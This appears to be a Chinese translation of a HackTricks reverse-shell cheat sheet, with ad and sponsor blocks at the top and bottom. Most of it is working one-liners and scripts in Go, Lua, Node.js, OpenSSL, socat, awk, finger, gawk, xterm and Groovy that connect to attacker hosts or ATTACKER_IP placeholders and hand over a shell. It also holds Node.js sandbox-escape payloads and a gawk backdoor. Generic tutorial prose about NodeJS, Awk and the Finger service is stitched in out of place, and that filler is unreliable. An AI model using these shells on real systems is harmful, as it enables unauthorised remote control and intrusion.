<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便您能更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua是一种轻量级的、高效的脚本语言，常用于嵌入式系统和游戏开发。它具有简单的语法和动态类型，易于学习和使用。Lua提供了强大的API，可以与其他编程语言进行交互。在渗透测试中，Lua可以用于编写自定义脚本，执行各种任务，如漏洞利用、信息收集和后渗透操作。以下是一些常用的Lua渗透测试技术和资源。

### Lua渗透测试技术

- **Lua脚本执行**：通过执行Lua脚本，可以利用目标系统上的漏洞或弱点执行各种攻击。Lua脚本可以用于执行命令、访问文件系统、执行远程代码等。

- **Lua远程代码执行**：利用目标系统上的Lua解释器，可以通过远程代码执行漏洞执行任意代码。这种技术可以用于获取系统访问权限、执行命令、上传下载文件等。

- **Lua代码注入**：通过向目标系统注入恶意Lua代码，可以实现各种攻击，如命令执行、信息泄露等。这种技术通常用于利用Web应用程序中的代码注入漏洞。

### Lua渗透测试资源

- **Lua脚本库**：有许多开源的Lua脚本库可用于渗透测试。这些库提供了各种功能，如端口扫描、漏洞利用、密码破解等。一些常用的Lua脚本库包括`luasocket`、`luasec`和`luaossl`。

- **Lua渗透测试框架**：有一些专门用于渗透测试的Lua框架可用于自动化渗透测试任务。这些框架提供了各种功能，如漏洞扫描、漏洞利用、信息收集等。一些常用的Lua渗透测试框架包括`Pentester's Framework`和`LuaNmap`。

- **Lua渗透测试工具**：有一些Lua渗透测试工具可用于执行特定的渗透测试任务。这些工具提供了各种功能，如漏洞扫描、密码破解、网络嗅探等。一些常用的Lua渗透测试工具包括`Nmap`和`Hydra`。

了解Lua的基本语法和API，并熟悉常用的Lua渗透测试技术和资源，将有助于您在渗透测试中更好地利用Lua进行攻击和防御。
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，用于构建快速、可扩展的网络应用程序。它允许开发人员使用 JavaScript 在服务器端运行代码，而不仅仅局限于浏览器环境。

### 安装 NodeJS

要安装 NodeJS，可以按照以下步骤进行操作：

1. 访问 NodeJS 官方网站（https://nodejs.org/）。
2. 下载适用于您操作系统的最新版本的 NodeJS。
3. 执行安装程序，并按照提示进行安装。

### 创建 NodeJS 服务器

要创建一个简单的 NodeJS 服务器，可以按照以下步骤进行操作：

1. 创建一个新的文件夹，并在其中创建一个名为 `server.js` 的文件。
2. 在 `server.js` 文件中，使用以下代码创建一个简单的 HTTP 服务器：

```javascript
const http = require('http');

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello, World!');
});

server.listen(3000, '127.0.0.1', () => {
  console.log('Server running at http://127.0.0.1:3000/');
});
```

3. 在命令行中，导航到包含 `server.js` 文件的文件夹，并运行以下命令启动服务器：

```bash
node server.js
```

4. 打开浏览器，并访问 `http://127.0.0.1:3000/`，您应该能够看到 "Hello, World!" 的消息。

### 安装第三方模块

NodeJS 提供了一个强大的包管理器，称为 npm（Node Package Manager），它允许您安装和管理第三方模块。

要安装第三方模块，可以按照以下步骤进行操作：

1. 在命令行中，导航到您的项目文件夹。
2. 运行以下命令安装所需的模块：

```bash
npm install 模块名称
```

3. 在您的代码中，使用 `require` 函数引入所需的模块。

```javascript
const 模块名称 = require('模块名称');
```

### 调试 NodeJS 应用程序

要调试 NodeJS 应用程序，可以使用 NodeJS 提供的内置调试器。

要使用内置调试器，可以按照以下步骤进行操作：

1. 在命令行中，导航到包含您的应用程序文件的文件夹。
2. 运行以下命令启动调试器：

```bash
node inspect 应用程序文件.js
```

3. 在浏览器中打开 `chrome://inspect`。
4. 单击 "Open dedicated DevTools for Node"。
5. 在打开的 DevTools 窗口中，您可以设置断点、查看变量的值，并逐步执行代码。

### 总结

NodeJS 是一个强大的 JavaScript 运行时环境，可用于构建服务器端应用程序。通过安装 NodeJS、创建服务器、安装第三方模块和使用内置调试器，您可以开始开发和调试 NodeJS 应用程序。
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

攻击者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
受害者

The victim refers to the target of a hacking attack. In the context of penetration testing, the victim is the system or network that is being tested for vulnerabilities. It is important for a hacker to identify and understand the victim's infrastructure, including the operating system, software, and network architecture. This knowledge helps the hacker to exploit weaknesses and gain unauthorized access to the victim's system. The victim can be an individual, an organization, or even a government entity. It is crucial for ethical hackers to obtain proper authorization before targeting a victim for testing purposes.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 绑定 shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### 反向 shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This is in contrast to a bind shell, where the attacker's machine initiates the connection to the target machine. 

反向 shell 是一种 shell，其中目标机器发起与攻击者机器的连接。这与绑定 shell 相反，绑定 shell 是攻击者机器发起与目标机器的连接。

Reverse shells are commonly used in post-exploitation scenarios, where an attacker has already gained access to a target machine and wants to maintain persistent access. By establishing a reverse shell, the attacker can remotely execute commands on the target machine and interact with its shell.

反向 shell 在后渗透场景中常被使用，当攻击者已经成功获取目标机器的访问权限并希望保持持久访问时。通过建立反向 shell，攻击者可以远程执行命令并与目标机器的 shell 进行交互。

There are various ways to create a reverse shell, including using netcat, socat, or custom scripts. The basic idea is to listen for incoming connections on the attacker's machine and redirect the input/output streams to a remote shell session on the target machine.

创建反向 shell 的方法有多种，包括使用 netcat、socat 或自定义脚本。基本思路是在攻击者的机器上监听传入的连接，并将输入/输出流重定向到目标机器上的远程 shell 会话。

Once a reverse shell is established, the attacker can execute commands, transfer files, and perform various actions on the target machine as if they were physically present.

一旦建立了反向 shell，攻击者可以像实际上在目标机器上一样执行命令、传输文件和执行各种操作。

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized system administration.

需要注意的是，非法和不道德地使用反向 shell 进行未授权访问是违法的。反向 shell 应仅用于合法目的，如渗透测试或经授权的系统管理。
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk是一种强大的文本处理工具，可以用于从文件或标准输入中提取和处理数据。它使用一种简单的编程语言，可以根据指定的模式和动作来处理文本。

Awk的基本语法如下：

```awk
pattern { action }
```

其中，`pattern`是用于匹配文本的模式，`action`是在匹配到模式时执行的操作。

Awk的工作流程如下：

1. 读取输入文本的一行。
2. 根据指定的模式进行匹配。
3. 如果匹配成功，则执行相应的操作。
4. 重复步骤1-3，直到处理完所有的输入行。

Awk提供了许多内置的变量和函数，可以在操作中使用。以下是一些常用的内置变量：

- `NR`：当前行的行号。
- `NF`：当前行的字段数。
- `$0`：当前行的完整内容。
- `$1`：当前行的第一个字段。
- `$2`：当前行的第二个字段。
- ...

以下是一些常用的Awk操作示例：

- 打印文件的每一行：`{ print }`
- 打印文件的第一列：`{ print $1 }`
- 打印文件的行号和内容：`{ print NR, $0 }`
- 根据条件过滤行：`/pattern/ { print }`

Awk还支持循环、条件语句和数组等高级功能，可以进行更复杂的文本处理操作。

要运行Awk脚本，可以使用以下命令：

```bash
awk -f script.awk input.txt
```

其中，`script.awk`是包含Awk脚本的文件，`input.txt`是要处理的输入文件。

Awk是一种非常灵活和强大的工具，可以用于各种文本处理任务，如数据提取、格式化、转换等。掌握Awk的基本用法对于进行文本处理和数据分析非常有帮助。
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
攻击者

## Description

The Finger service is a simple network protocol that allows users to retrieve information about other users on a remote system. It is commonly used to find out information such as the user's full name, login time, and the last time they checked their email.

## Vulnerabilities

The Finger service can be vulnerable to several attacks, including:

1. User Enumeration: Attackers can use the Finger service to enumerate valid usernames on a remote system. By iterating through a list of common usernames, an attacker can determine which usernames are valid and potentially use this information for further attacks.

2. Information Disclosure: The Finger service may reveal sensitive information about users, such as their full name, login time, and email status. This information can be used by attackers for social engineering or targeted attacks.

3. Denial of Service: Attackers can flood the Finger service with requests, causing it to become overwhelmed and unresponsive. This can result in a denial of service for legitimate users trying to access the service.

## Mitigation

To mitigate the risks associated with the Finger service, consider the following measures:

1. Disable the Finger service: If the Finger service is not required for legitimate purposes, it is recommended to disable it entirely to eliminate the associated vulnerabilities.

2. Implement access controls: If the Finger service is necessary, ensure that access to it is restricted to authorized users only. This can be achieved by implementing firewall rules or using access control lists (ACLs).

3. Limit information disclosure: Configure the Finger service to only provide necessary information and avoid disclosing sensitive details such as full names or email statuses.

4. Monitor for suspicious activity: Regularly monitor the Finger service for any unusual or suspicious activity, such as repeated failed login attempts or excessive requests. This can help detect and mitigate potential attacks.

## References

- [RFC 742: The Finger User Information Protocol](https://tools.ietf.org/html/rfc742)
```bash
while true; do nc -l 79; done
```
发送命令，请将其写下，按下回车键，然后按下CTRL+D（停止STDIN）

**受害者**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk是一种强大的文本处理工具，它是GNU Awk的缩写。它是一种解释性的编程语言，用于处理和转换文本数据。Gawk提供了许多内置函数和特性，使其成为处理结构化和非结构化数据的理想选择。

### Gawk的基本用法

要使用Gawk，您需要在终端中键入以下命令：

```shell
gawk 'pattern { action }' file
```

其中，`pattern`是一个正则表达式，用于匹配输入文件中的行。`action`是在匹配到的行上执行的操作。`file`是要处理的输入文件。

以下是一个简单的示例，演示了如何使用Gawk来打印文件中包含特定单词的行：

```shell
gawk '/word/ { print }' file.txt
```

### Gawk的高级用法

除了基本用法外，Gawk还提供了许多高级功能，如：

- 使用内置函数：Gawk提供了许多内置函数，用于处理字符串、日期、数学运算等。您可以在Gawk的官方文档中找到完整的函数列表和用法示例。

- 自定义变量：您可以在Gawk脚本中定义自己的变量，并在操作中使用它们。这使得您可以在处理数据时进行计算和存储。

- 控制流语句：Gawk支持条件语句（如if-else）和循环语句（如for和while），使您能够根据需要执行不同的操作。

- 输出格式化：使用Gawk的内置函数和格式化字符串，您可以控制输出的格式，使其更易读和易于解析。

### Gawk的资源和学习资料

要深入了解Gawk的更多功能和用法，您可以参考以下资源：

- Gawk官方文档：https://www.gnu.org/software/gawk/manual/

- 在线教程和示例：许多网站提供了关于Gawk的教程和示例，您可以通过搜索引擎找到适合您的学习资源。

- 社区支持：加入Gawk的用户社区，与其他用户交流经验和解决问题。

- 书籍和参考资料：有许多书籍和参考资料专门介绍Gawk的使用和技巧，您可以选择适合您的学习材料。

希望这些信息能帮助您开始使用Gawk，并利用其强大的文本处理功能。
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

xterm会话是最简单的反向shell形式之一。在服务器上运行以下命令。它将尝试在TCP端口6001上回连到您的IP地址（10.0.0.1）。
```bash
xterm -display 10.0.0.1:1
```
要捕获传入的xterm，启动一个X-Server（:1 - 监听TCP端口6001）。一种方法是使用Xnest（在您的系统上运行）：
```bash
Xnest :1
```
您需要授权目标连接到您（也在您的主机上运行的命令）：
```bash
xhost +targetip
```
## Groovy

由[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)注意：Java反向shell也适用于Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 参考文献

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，从API到Web应用程序和云系统中查找问题。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
